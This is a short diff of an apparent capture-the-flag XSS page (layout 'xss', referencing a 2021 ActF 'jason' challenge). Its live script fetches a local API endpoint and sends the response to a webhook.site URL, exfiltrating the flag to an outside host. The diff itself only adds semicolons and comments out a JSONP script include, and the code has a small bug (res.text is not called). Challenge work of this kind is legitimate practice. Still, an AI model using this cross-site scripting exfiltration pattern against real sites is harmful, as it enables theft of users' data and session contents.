@@ -23,17 +23,17 @@ layout: xss
     }
 
     function getFlag(webhook, flag) {
-        payload = JSON.stringify(flag)
+        payload = JSON.stringify(flag);
         fetch(webhook + payload)
             .then(res => console.log("DONE", res));
     }
 
-    let url = "127.0.0.1:1337/api/entries"
-    let webhook = "https://webhook.site/e1c87264-f400-40d6-afa9-6ba829adcfbe/"
+    let url = "127.0.0.1:1337/api/entries";
+    let webhook = "https://webhook.site/e1c87264-f400-40d6-afa9-6ba829adcfbe/";
     fetch(url)
         .then(res => res.text)
         .then(text => getFlag(webhook, text));
 
 </script>
 
-<script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer"></script>
+<!-- <script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer"></script> -->
